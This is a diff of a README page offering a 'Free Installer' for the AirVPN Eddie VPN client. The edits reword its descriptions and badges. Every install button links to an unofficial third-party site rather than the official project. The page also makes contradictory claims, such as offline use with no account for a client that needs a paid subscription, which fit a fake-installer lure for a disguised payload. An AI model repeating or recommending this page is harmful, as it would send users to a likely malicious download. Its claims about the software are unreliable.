@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-VPN+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 AirVPN Eddie Free Installer** — AirVPN Eddie is the official open-source client for AirVPN, a privacy-focused VPN service operated by a team with strong civil liberties values. Works without internet access, no account required. Full offline installation.
+**💻 AirVPN Eddie Free Installer** — Eddie is the free, open-source VPN client for AirVPN, a privacy-focused VPN service. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install AirVPN Eddie](https://img.shields.io/badge/⬇_Install_AirVPN%20Eddie-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AirVPN Eddie](https://img.shields.io/badge/⬇_Install_AirVPN+Eddie-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About AirVPN Eddie
 
-AirVPN Eddie is the official open-source client for AirVPN, a privacy-focused VPN service operated by a team with strong civil liberties values. It supports OpenVPN and WireGuard protocols, advanced network lock (kill switch), and DNS leak protection.
+Eddie is the free, open-source VPN client for AirVPN, a privacy-focused VPN service. Features include network lock to prevent IP leaks, AES-256 encryption, OpenVPN and WireGuard protocols, traffic splitting, and detailed connection logs. Running on Windows, macOS, and Linux, Eddie provides a full-featured VPN client for AirVPN subscribers who want maximum privacy and protocol transparency.
 
 ---
 
 ## ❌ Problem: AirVPN Eddie is hard to access
 
-- **AirVPN Subscription Required** — Free trial limited; full use requires paid subscription
-- **Complex Interface** — Feature-rich UI intimidating for users wanting simple one-click VPN
-- **Server Speed Variance** — Speeds vary significantly across server locations
-- **No Mobile App** — Eddie is desktop-only; mobile requires separate setup
+- **AirVPN Subscription Required** — Client only works with AirVPN service subscription
+- **Technical Interface** — Feature-rich, technical interface less beginner-friendly than consumer VPNs
+- **Performance** — AirVPN server performance varies by location
+- **Price Point** — AirVPN subscription cost higher than some mainstream VPN providers
 
 ---
 
@@ -81,7 +81,7 @@ AirVPN Eddie is the official open-source client for AirVPN, a privacy-focused VP
 
 <div align="center">
 
-[![⬇ Install AirVPN Eddie](https://img.shields.io/badge/⬇_Install_AirVPN%20Eddie-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AirVPN Eddie](https://img.shields.io/badge/⬇_Install_AirVPN+Eddie-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ AirVPN Eddie is the official open-source client for AirVPN, a privacy-focused VP
 
 ---
 
-**AirVPN Eddie Free Installer** — AirVPN Eddie is the official open-source client for AirVPN, a privacy-focused VPN service operated by a team with strong civil liberties values. Install without internet connection today!
+**AirVPN Eddie Free Installer** — Eddie is the free, open-source VPN client for AirVPN, a privacy-focused VPN service. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install AirVPN Eddie](https://img.shields.io/badge/⬇_Install_AirVPN%20Eddie-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AirVPN Eddie](https://img.shields.io/badge/⬇_Install_AirVPN+Eddie-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
